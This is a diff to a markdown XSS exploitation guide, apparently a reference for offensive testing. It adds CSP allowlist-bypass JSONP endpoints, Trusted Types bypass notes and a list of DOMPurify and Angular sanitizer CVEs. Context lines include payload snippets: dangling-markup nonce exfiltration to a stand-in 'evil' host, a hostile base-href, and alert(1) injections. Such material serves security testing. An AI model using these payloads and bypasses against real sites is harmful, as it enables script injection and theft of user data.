@@ -120,7 +120,7 @@ Concrete bypass classes, in rough order of frequency:
 - **Nonce leakage** → if the nonce appears in a reflectable location or you can read partial markup via dangling-markup injection, copy it into your own `<script nonce=...>`. Dangling-markup: `<img src='//evil?` swallows subsequent markup up to the next quote, exfiltrating the nonce to your server.
 - **Missing `base-uri`** → `<base href="//evil.tld/">` retargets every relative `<script src>` to your origin (works even under a host-allowlist that assumed relative paths stay same-origin).
 - **Missing `object-src 'none'`** → `<object data="data:text/html,<script>alert(1)</script>">` / `<embed>`.
-- **Allowlisted CDN hosting a gadget** → `script-src *.googleapis.com` lets you load AngularJS from `ajax.googleapis.com` and run a CSTI payload; an allowlisted host exposing JSONP (`//allowed/api?callback=alert(1)//`) is direct execution. Enumerate every allowlisted host for JSONP endpoints and known-gadget libraries.
+- **Allowlisted CDN hosting a gadget** → `script-src *.googleapis.com` lets you load AngularJS from `ajax.googleapis.com` and run a CSTI payload; an allowlisted host exposing JSONP (`//allowed/api?callback=alert(1)//`) is direct execution. Google's own **csp-evaluator** ships a machine-readable script-src allowlist-bypass database (`allowlist_bypasses/json/jsonp.json` at `github.com/google/csp-evaluator`) with two top-level keys: `needsEval` (6 domains — `googletagmanager.com`, `www.googletagmanager.com`, `www.googleadservices.com`, `google-analytics.com`, `ssl.google-analytics.com`, `www.google-analytics.com` — bypasses that also require `unsafe-eval`) and `urls` (134+ protocol-relative JSONP endpoint paths). Confirmed bypass origins in the `urls` list include Google's own script-hosting fleet (`google-analytics.com/gtm/js`, `googleadservices.com`, `ajax.googleapis.com`, `maps.googleapis.com/maps/api/js/GeoPhotoService.GetMetadata`, `googleusercontent.com/gadgets/proxy`, `doubleclick.net`, `googletagmanager.com/gtm/js`) and widely allowlisted third-party origins: Facebook (`api.facebook.com/restserver.php`, `graph.facebook.com/1/`, `www.facebook.com/restserver.php`), Twitter/X (`publish.twitter.com/oembed`, `syndication.twitter.com`, `cdn.syndication.twitter.com`), Vimeo (`vimeo.com/api/oembed.json/`), Yandex (`mc.yandex.ru`, `share.yandex.net`, `translate.yandex.net/api/v1.5/tr.json/detect`), Yahoo (`query.yahooapis.com/v1/public/yql`, `pipes.yahooapis.com/pipes/pipe.run`), Mixpanel (`api.mixpanel.com/track/`), Flickr (`api.flickr.com/services/feeds/photos_friends.gne`), Instagram (`api.instagram.com/v1/tags/.../media/recent`). Match your target's `script-src` allowlist against this list; any match with a JSONP-shape reachable endpoint is a direct execution primitive. Enumerate every allowlisted host for JSONP endpoints and known-gadget libraries.
 - **`data:`/`blob:` in `script-src`** → `<script src="data:text/javascript,alert(1)">`.
 - **CSP injection** → if you control a reflected value that lands in the CSP header (header injection) or a `<meta http-equiv="Content-Security-Policy">` you can inject, add a weaker policy or a `script-src` host you control. Load `header_injection` for the response-splitting path.
 - **`report-uri`/`report-to` exfiltration** → a violation report includes the blocked URI; craft violations whose blocked URL encodes secret data to leak it to your `report-uri` even when script is blocked.
@@ -138,11 +138,13 @@ the nonce is unpredictable and unleakable, this is genuinely a False Positive
 - Custom policies returning unsanitized strings; abuse policy whitelists
 - Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets
 
-TT is enforced by `Content-Security-Policy: require-trusted-types-for
-'script'` (optionally with `trusted-types <names>` to allowlist policy
-names). Concrete bypasses:
+The W3C Trusted Types spec (editor's draft at `w3c.github.io/trusted-types/dist/spec/`) defines exactly three type classes — `TrustedHTML`, `TrustedScript`, `TrustedScriptURL` — and gates an enumerated sink set: `Element.innerHTML`/`outerHTML`, `insertAdjacentHTML()`, `Document.write()`/`execCommand()`, `HTMLScriptElement.text` and `.src`, `SVGScriptElement` contexts, `Range.createContextualFragment()`, `DOMParser.parseFromString()`, Worker/ServiceWorker script URLs, event-handler attributes, and `setTimeout`/`setInterval` with a string argument. Enforcement is switched on via `Content-Security-Policy: require-trusted-types-for 'script'` (spec §4.2.1); the pre-navigation check (§4.2.1.1) also runs a Process-value-with-a-default-policy algorithm over `javascript:` URL requests before navigation completes, so `Location.href` is validated with `expectedType=TrustedScript` and `sink=Location href`, returning Blocked when no `TrustedScript` is produced. Optionally `trusted-types <names>` allowlists policy names; when absent, any policy name can be created.
 
-- **Lax default policy** — an app that registers `trustedTypes.createPolicy('default', {createHTML: s => s})` (identity, or a transform that still returns unsafe HTML) routes *every* unguarded `innerHTML`/`script.src` assignment through it, making it a universal bypass. Grep the bundle for `createPolicy('default'` and read what it returns.
+The spec explicitly enumerates **four Non-Goals** — coverage gaps that constitute the residual exploitation surface even under full enforcement: (1) server-side reflections into script bodies; (2) cross-origin JavaScript execution via `data:` URLs; (3) resource confinement / data exfiltration prevention; (4) protection against a malicious author of the application's own JavaScript. Any XSS exploiting one of these four surfaces is compatible with strict Trusted Types.
+
+Concrete bypasses:
+
+- **Lax default policy** (Trusted Types spec §2.3.4) — the Default policy mechanism is invoked when a plain string reaches a guarded sink, providing an application-defined coercion path via `createPolicy('default', {...})`. An app registering `trustedTypes.createPolicy('default', {createHTML: s => s})` (identity, or a transform that still returns unsafe HTML) routes *every* unguarded `innerHTML`/`script.src` assignment through it, making it a universal bypass. This is the concrete surface for default-policy-escape bypass classes documented in Cure53 and Google Security Team research. Grep the bundle for `createPolicy('default'` and read what it returns.
 - **Reusable named policy** — if `trusted-types foo` is allowed and a policy `foo` does an identity `createHTML`/`createScript`/`createScriptURL`, call it yourself:
   ```javascript
   trustedTypes.createPolicy('foo').createHTML('<img src=x onerror=alert(1)>')
@@ -228,6 +230,15 @@ Other sanitizers with allowlist-config bypasses: `sanitize-html`, `js-xss`
 (`xss` npm), `bleach` (Python), `sanitize`/`loofah` (Ruby). Validate by
 round-tripping your candidate through the exact sanitizer + config and
 checking whether the browser's re-parse produces an executing node.
+
+**The 2024–2026 DOMPurify CVE cluster.** Five published bypasses populate the mutation-XSS class over the last two years:
+
+- **CVE-2024-45801** and **CVE-2024-47875** — depth-guard bypass class (SVG/MathML nesting + prototype-pollution weakening of the depth counter).
+- **CVE-2025-26791** — `SAFE_FOR_TEMPLATES` bypass via the WHATWG incorrectly-opened-comment exception + text-node coalescing.
+- **CVE-2026-0540** — `SAFE_FOR_XML` attribute-value regex gap.
+- **CVE-2026-47423** — engine-deferred mutation via Chrome 130+ `<selectedcontent>` re-cloning (novel category — sanitizer-vs-engine timing rather than sanitizer-vs-browser parse).
+
+The cluster demonstrates the class is durable — each fix patches a specific parser or engine divergence while the class survives via the next divergence. Version-fingerprint the target's `DOMPurify.version` and match a version-specific payload. Load `xss_novel_deep.md § The 2024–2026 DOMPurify CVE Cluster — Mechanism by Mechanism` for the canonical version/fix table (fixed versions, GHSA IDs, reporters), per-CVE mechanism decomposition, and payload construction.
 
 ## Script Gadgets
 
@@ -328,6 +339,7 @@ filter does not match but the browser still executes.
 - Template compilation of user-provided templates (`$compile` in AngularJS; dynamic component templates) → CSTI.
 - **Legacy AngularJS**: expression sandbox escapes pre-1.6; the sandbox was removed in 1.6, so any `{{}}` interpolation of user input is direct execution.
 - `$sce` trust APIs misused to whitelist attacker content.
+- **CVE-2026-88057** — Angular compile-time-vs-runtime sanitization differential: the compiler resolved SecurityContext based on the declaring directive/component selector rather than the concrete host element, so directives whose host bindings land on different elements at runtime (five enumerable patterns) bypass sanitization. Primitive: arbitrary JavaScript execution via `javascript:` URL bindings on the concrete host. Load `xss_novel_deep.md § Angular CVE-2026-88057 — Five-Pattern Depth` for the canonical affected-version table (`@angular/core` and `@angular/compiler` ranges), GHSA, the five patterns with detection greps, and per-pattern operational depth.
 
 ### Svelte
 
